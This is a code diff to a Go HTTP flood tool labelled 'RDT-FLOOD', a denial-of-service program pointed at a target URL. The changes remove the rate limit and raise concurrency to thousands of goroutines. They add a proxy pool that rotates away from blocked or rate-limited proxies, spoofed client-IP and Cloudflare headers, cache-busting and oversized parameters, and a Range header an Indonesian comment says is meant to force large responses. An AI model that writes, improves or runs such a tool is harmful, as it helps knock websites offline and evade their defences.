@@ -21,13 +21,13 @@ import (
 	"time"
 )
 
-
 const (
-	wrk          = 1500 
-	to           = 3 * time.Second 
-	sub          = 5
-	RPS_CONTROL  = 300 
-	KEEP_ALIVE   = 30 * time.Second
+	wrk         = 2000
+	to          = 6 * time.Second
+	sub         = 5
+	KEEP_ALIVE  = 30 * time.Second
+	MAX_FAIL    = 3
+	RPS_CONTROL = 0
 )
 
 var UA = []string{
@@ -103,6 +103,147 @@ var PATH_POOL = []string{
 type CLI struct {
 	client *http.Client
 	ip     string
+}
+
+type ProxyNode struct {
+	cli       *CLI
+	active    bool
+	failCount int
+	mu        sync.Mutex
+}
+
+type ProxyPool struct {
+	nodes    []*ProxyNode
+	index    int
+	mu       sync.Mutex
+	fallback *CLI
+}
+
+func NewProxyPool(proxies []*url.URL) *ProxyPool {
+	pool := &ProxyPool{
+		nodes: make([]*ProxyNode, 0, len(proxies)),
+	}
+	for _, p := range proxies {
+		cli := createCLI(p)
+		pool.nodes = append(pool.nodes, &ProxyNode{
+			cli:    cli,
+			active: true,
+		})
+	}
+	if len(pool.nodes) == 0 {
+		pool.fallback = createCLI(nil)
+	}
+	return pool
+}
+
+func createCLI(proxyURL *url.URL) *CLI {
+	tr := &http.Transport{
+		DialContext: (&net.Dialer{
+			Timeout:   3 * time.Second,
+			KeepAlive: KEEP_ALIVE,
+		}).DialContext,
+		DisableKeepAlives:      false,
+		MaxIdleConns:           50000,
+		MaxIdleConnsPerHost:    50000,
+		MaxConnsPerHost:        0,
+		IdleConnTimeout:        KEEP_ALIVE,
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+			MaxVersion:         tls.VersionTLS13,
+			NextProtos:         []string{"h2", "http/1.1"},
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+			},
+		},
+		ForceAttemptHTTP2:     true,
+		DisableCompression:    false,
+		TLSHandshakeTimeout:   3 * time.Second,
+		ResponseHeaderTimeout: 2 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+	}
+	ip := ""
+	if proxyURL != nil {
+		tr.Proxy = http.ProxyURL(proxyURL)
+		ip = proxyURL.Hostname()
+	}
+	jar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   to,
+		Jar:       jar,
+	}
+	return &CLI{client: client, ip: ip}
+}
+
+func (p *ProxyPool) GetNextProxy() *CLI {
+	p.mu.Lock()
+	defer p.mu.Unlock()
+
+	if len(p.nodes) == 0 {
+		if p.fallback != nil {
+			return p.fallback
+		}
+		return nil
+	}
+
+	start := p.index
+	for i := 0; i < len(p.nodes); i++ {
+		idx := (start + i) % len(p.nodes)
+		node := p.nodes[idx]
+		node.mu.Lock()
+		if node.active {
+			node.mu.Unlock()
+			p.index = (idx + 1) % len(p.nodes)
+			return node.cli
+		}
+		node.mu.Unlock()
+	}
+
+	p.ResetAll()
+	if len(p.nodes) > 0 {
+		node := p.nodes[0]
+		node.mu.Lock()
+		node.active = true
+		node.mu.Unlock()
+		return node.cli
+	}
+	if p.fallback != nil {
+		return p.fallback
+	}
+	return nil
+}
+
+func (p *ProxyPool) MarkFailed(cli *CLI) {
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	for _, node := range p.nodes {
+		if node.cli == cli {
+			node.mu.Lock()
+			node.failCount++
+			if node.failCount >= MAX_FAIL {
+				node.active = false
+			}
+			node.mu.Unlock()
+			break
+		}
+	}
+}
+
+func (p *ProxyPool) ResetAll() {
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	for _, node := range p.nodes {
+		node.mu.Lock()
+		node.active = true
+		node.failCount = 0
+		node.mu.Unlock()
+	}
 }
 
 func init() {
@@ -185,11 +326,16 @@ func RIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
 }
 
-func getRandomPath() string {
-	return PATH_POOL[rand.Intn(len(PATH_POOL))]
+func RST(length int) string {
+	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, length)
+	for i := range b {
+		b[i] = chars[rand.Intn(len(chars))]
+	}
+	return string(b)
 }
 
-var customCookie string = ""
+var customCookie string
 
 func main() {
 	if len(os.Args) < 2 {
@@ -211,7 +357,7 @@ func main() {
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
 
-	var proxies []*url.URL
+	var proxyURLs []*url.URL
 	file, err := os.Open("proxy.txt")
 	if err == nil {
 		defer file.Close()
@@ -225,65 +371,22 @@ func main() {
 				line = "http://" + line
 			}
 			if p, err := url.Parse(line); err == nil {
-				proxies = append(proxies, p)
+				proxyURLs = append(proxyURLs, p)
 			}
 		}
 	}
-	if len(proxies) == 0 {
-		proxies = append(proxies, nil)
+	if len(proxyURLs) == 0 {
+		proxyURLs = append(proxyURLs, nil)
 	}
 
-	wcs := make([]CLI, len(proxies))
-	for i, PROXYLINK := range proxies {
-		tr := &http.Transport{
-			DialContext: (&net.Dialer{
-				Timeout:   3 * time.Second,
-				KeepAlive: KEEP_ALIVE,
-			}).DialContext,
-			DisableKeepAlives:      false,
-			MaxIdleConns:           50000,
-			MaxIdleConnsPerHost:    50000,
-			MaxConnsPerHost:        0,
-			IdleConnTimeout:        KEEP_ALIVE,
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-				MinVersion:         tls.VersionTLS12,
-				MaxVersion:         tls.VersionTLS13,
-				NextProtos:         []string{"h2", "http/1.1"},
-				CipherSuites: []uint16{
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-				},
-			},
-			ForceAttemptHTTP2:     true,
-			DisableCompression:    false,
-			TLSHandshakeTimeout:   3 * time.Second,
-			ResponseHeaderTimeout: 2 * time.Second,
-			ExpectContinueTimeout: 1 * time.Second,
-		}
-		ip := ""
-		if PROXYLINK != nil {
-			tr.Proxy = http.ProxyURL(PROXYLINK)
-			ip = PROXYLINK.Hostname()
-		}
-		jar, _ := cookiejar.New(nil)
-		client := &http.Client{
-			Transport: tr,
-			Timeout:   to,
-			Jar:       jar,
-		}
-		wcs[i] = CLI{client: client, ip: ip}
-	}
+	pool := NewProxyPool(proxyURLs)
+
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
 	fmt.Printf("ޗ | Target : %s\n", tgt)
-	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
-	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
+	fmt.Printf("ޗ | Time   : %d s\n", dur)
+	fmt.Printf("ޗ | Proxy  : %d\n", len(proxyURLs))
 	fmt.Printf("ޗ | Conc   : %d\n", wrk)
 	if customCookie != "" {
 		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
@@ -294,51 +397,51 @@ func main() {
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
+
 	if dur > 0 {
 		time.AfterFunc(time.Duration(dur)*time.Second, func() {
 			cancel()
 		})
 	}
 
-	rateLimiter := time.NewTicker(time.Second / time.Duration(RPS_CONTROL))
-	defer rateLimiter.Stop()
-
 	for i := 0; i < wrk; i++ {
 		wg.Add(1)
-		c := wcs[i%len(wcs)]
-		go func(cli CLI) {
+		go func(workerID int) {
 			defer wg.Done()
 			var swg sync.WaitGroup
 			for s := 0; s < sub; s++ {
 				swg.Add(1)
-				go func() {
+				go func(subID int) {
 					defer swg.Done()
+					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID*1000+subID)))
+
 					for ctx.Err() == nil {
-						select {
-						case <-rateLimiter.C:
-						default:
+						cli := pool.GetNextProxy()
+						if cli == nil {
+							continue
 						}
 
-						param := CBP[rand.Intn(len(CBP))]
-						reqURL := tgt
+						path := PATH_POOL[rng.Intn(len(PATH_POOL))]
+						reqURL := tgt + path
+						param := CBP[rng.Intn(len(CBP))]
 						if strings.Contains(reqURL, "?") {
-							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
+							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rng.Int63())
 						} else {
-							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
+							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rng.Int63())
 						}
-						if rand.Intn(5) == 0 {
-							reqURL += "&big=" + strings.Repeat("x", 1024+rand.Intn(1024))
+						if rng.Intn(5) == 0 {
+							reqURL += "&big=" + strings.Repeat("x", 1024+rng.Intn(1024))
 						}
-						if rand.Intn(10) == 0 {
+						if rng.Intn(10) == 0 {
 							reqURL += "&" + RST(8) + "=" + RST(12)
 						}
 
-						req, _ := http.NewRequest("GET", reqURL, nil)
+						ua := UA[rng.Intn(len(UA))]
+						ACCept := ACC[rng.Intn(len(ACC))]
+						lang := LAN[rng.Intn(len(LAN))]
+						enc := ENC[rng.Intn(len(ENC))]
 
-						ua := UA[rand.Intn(len(UA))]
-						ACCept := ACC[rand.Intn(len(ACC))]
-						lang := LAN[rand.Intn(len(LAN))]
-						enc := ENC[rand.Intn(len(ENC))]
+						req, _ := http.NewRequest("GET", reqURL, nil)
 
 						req.Header.Set("User-Agent", ua)
 						req.Header.Set("Accept", ACCept)
@@ -349,25 +452,33 @@ func main() {
 						req.Header.Set("Pragma", "no-cache")
 						req.Header.Set("Upgrade-Insecure-Requests", "1")
 						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
-						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
+						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rng.Int63()))
 
-						if rand.Intn(3) == 0 {
-							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
+						if rng.Intn(3) == 0 {
+							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rng.Int63()))
 						}
-						if rand.Intn(3) == 0 {
-							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
+						if rng.Intn(3) == 0 {
+							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rng.Int63()))
 						}
-						if rand.Intn(3) == 0 {
-							req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rand.Int63()))
+						if rng.Intn(3) == 0 {
+							req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rng.Int63()))
 						}
-						if rand.Intn(5) == 0 {
+						if rng.Intn(5) == 0 {
 							req.Header.Set("X-Real-IP", RIP())
 						}
-						if rand.Intn(5) == 0 {
+						if rng.Intn(5) == 0 {
 							req.Header.Set("CF-Connecting-IP", RIP())
 						}
-						if rand.Intn(5) == 0 {
+						if rng.Intn(5) == 0 {
 							req.Header.Set("CDN-Loop", "cloudflare")
+						}
+
+						// Tambahan dari script lama: Range header untuk memaksa server mengirim data besar
+						if rng.Intn(4) == 0 {
+							req.Header.Set("Range", "bytes=0-")
+						}
+						if rng.Intn(6) == 0 {
+							req.Header.Set("X-Requested-With", "XMLHttpRequest")
 						}
 
 						var cookies []string
@@ -375,16 +486,16 @@ func main() {
 							cookies = append(cookies, customCookie)
 						}
 						for _, name := range COOKIES {
-							if rand.Intn(2) == 0 {
-								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
+							if rng.Intn(2) == 0 {
+								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rng.Int63()))
 							}
 						}
 						if len(cookies) > 0 {
 							req.Header.Set("Cookie", strings.Join(cookies, "; "))
 						}
 
-						if rand.Intn(8) != 0 {
-							ref := REF[rand.Intn(len(REF))]
+						if rng.Intn(8) != 0 {
+							ref := REF[rng.Intn(len(REF))]
 							req.Header.Set("Referer", ref+host)
 						}
 
@@ -409,15 +520,21 @@ func main() {
 						req.Header.Set("True-Client-IP", PID)
 
 						resp, err := cli.client.Do(req)
-						if err == nil {
-							io.Copy(io.Discard, resp.Body)
-							resp.Body.Close()
+						if err != nil {
+							pool.MarkFailed(cli)
+							continue
+						}
+						io.Copy(io.Discard, resp.Body)
+						resp.Body.Close()
+
+						if resp.StatusCode == 403 || resp.StatusCode == 429 {
+							pool.MarkFailed(cli)
 						}
 					}
-				}()
+				}(s)
 			}
 			swg.Wait()
-		}(c)
+		}(i)
 	}
 
 	sig := make(chan os.Signal, 1)
@@ -428,13 +545,4 @@ func main() {
 	case <-ctx.Done():
 	}
 	wg.Wait()
-}
-
-func RST(length int) string {
-	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, length)
-	for i := range b {
-		b[i] = chars[rand.Intn(len(chars))]
-	}
-	return string(b)
 }
